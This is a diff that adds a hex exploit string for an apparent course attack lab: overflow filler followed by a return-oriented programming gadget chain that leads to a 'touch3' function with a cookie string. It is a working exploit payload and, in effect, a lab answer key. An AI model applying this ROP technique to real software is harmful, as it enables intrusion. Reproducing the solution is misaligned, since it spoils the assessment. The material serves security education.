@@ -1,0 +1,17 @@
+ff ff ff ff ff ff ff ff   /* rbuff_start: filler */
+ff ff ff ff ff ff ff ff   /* rbuff_8:     filler */
+ff ff ff ff ff ff ff ff   /* rbuff_16:    filler */
+ff ff ff ff ff ff ff ff   /* rbuff_24:    filler */
+ff ff ff ff ff ff ff ff   /* rbuff_end:   filler */
+cc 19 40 00 00 00 00 00   /* return_addr: gadget_1 */
+20 00 00 00 00 00 00 00   /* caller_0:    value(0x20) */
+dd 19 40 00 00 00 00 00   /* caller_8:    gadget_4 */
+34 1a 40 00 00 00 00 00   /* caller_16:   gadget_5 */
+13 1a 40 00 00 00 00 00   /* caller_24:   gadget_6 */
+06 1a 40 00 00 00 00 00   /* caller_32:   gadget_3 */
+c5 19 40 00 00 00 00 00   /* caller_40:   gadget_2 */
+d6 19 40 00 00 00 00 00   /* caller_48:   gadget_7 */
+c5 19 40 00 00 00 00 00   /* caller_56:   gadget_2 */
+fa 18 40 00 00 00 00 00   /* caller_64:   touch3_addr */
+35 39 62 39 39 37 66 61   /* caller_72:   cookie_str */
+00 00 00 00 00 00 00 00   /* caller_80:   empty */
